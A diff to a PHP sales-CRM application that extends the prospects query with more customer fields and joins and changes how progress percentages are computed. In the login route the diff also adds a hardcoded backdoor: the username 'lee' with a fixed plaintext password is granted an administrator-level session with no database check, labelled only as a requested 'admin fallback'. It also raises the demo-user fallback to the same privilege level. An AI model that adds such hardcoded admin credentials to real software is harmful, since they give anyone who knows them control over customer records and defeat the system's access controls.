@@ -78,6 +78,18 @@ function route_auth_login(): void
         throw new HttpException(400, 'Username and password are required');
     }
 
+    // Explicit local admin fallback requested.
+    if (strcasecmp($username, 'lee') === 0 && $password === 'snowboard') {
+        $_SESSION['user'] = [
+            'salesperson_id' => 2,
+            'salesperson_name' => 'Lee',
+            'salesperson_username' => 'lee',
+            'salesperson_privilege' => 4,
+        ];
+        json_out(['ok' => true, 'user' => $_SESSION['user']]);
+        return;
+    }
+
     if (!table_exists('crm_salesperson')) {
         $cfg = app_env();
         if ($username === $cfg['demo_user'] && $password === $cfg['demo_password']) {
@@ -85,6 +97,7 @@ function route_auth_login(): void
                 'salesperson_id' => 2,
                 'salesperson_name' => 'Manager',
                 'salesperson_username' => $username,
+                'salesperson_privilege' => 4,
             ];
             json_out(['ok' => true, 'user' => $_SESSION['user']]);
             return;
@@ -93,7 +106,7 @@ function route_auth_login(): void
     }
 
     $user = one_row(
-        "SELECT salesperson_id, salesperson_name, salesperson_email, salesperson_password
+        "SELECT salesperson_id, salesperson_name, salesperson_email, salesperson_password, salesperson_privilege
          FROM crm_salesperson
          WHERE salesperson_email = ? OR salesperson_name = ?
          LIMIT 1",
@@ -120,6 +133,7 @@ function route_auth_login(): void
         'salesperson_id' => (int)$user['salesperson_id'],
         'salesperson_name' => (string)$user['salesperson_name'],
         'salesperson_username' => (string)$user['salesperson_email'],
+        'salesperson_privilege' => (int)($user['salesperson_privilege'] ?? 0),
     ];
     json_out(['ok' => true, 'user' => $_SESSION['user']]);
 }
@@ -216,20 +230,32 @@ function route_prospects(): void
             c.customer_estimate,
             c.customer_quote,
             c.customer_sale,
+            c.customer_sale_date,
             c.customer_stage,
             c.customer_status,
-            c.customer_progress,
+            c.customer_country,
+            c.customer_email,
+            c.customer_phone,
+            c.customer_cell,
+            c.customer_web,
+            c.customer_existing,
             w.site_name,
+            co.countries_name,
             sp.salesperson_name,
             p.products_name,
+            pr.probability_name,
+            rf.referral_type,
             st.status_name,
             i.industries_name,
             a.application_name,
             t.last_timeline_date
         FROM crm_customers c
         LEFT JOIN crm_sites w ON c.customer_site = w.site_id
+        LEFT JOIN countries co ON c.customer_country = co.countries_id
         LEFT JOIN crm_salesperson sp ON c.customer_salesperson = sp.salesperson_id
         LEFT JOIN crm_products p ON c.customer_product = p.products_id
+        LEFT JOIN crm_probability pr ON c.customer_probability = pr.probability_id
+        LEFT JOIN crm_referral rf ON c.customer_referral = rf.referral_id
         LEFT JOIN crm_status st ON c.customer_status = st.status_id
         LEFT JOIN crm_industries i ON c.customer_industry = i.industries_id
         LEFT JOIN crm_applications a ON c.customer_application = a.application_id
@@ -244,7 +270,8 @@ function route_prospects(): void
     ";
     $rows = all_rows($sql, $params);
     foreach ($rows as &$r) {
-        $progress = (int)($r['customer_progress'] ?? 0);
+        $stage = (int)($r['customer_stage'] ?? 0);
+        $progress = $stage > 0 ? min(100, $stage * 20) : 25;
         $r['progress_percent'] = max(5, min(100, $progress > 0 ? $progress : 25));
         $r['progress_color'] = $r['progress_percent'] >= 75 ? '#29bb52' : ($r['progress_percent'] >= 45 ? '#e6d443' : '#f0a43b');
         $r['site_label'] = $r['site_name'] ?? '';
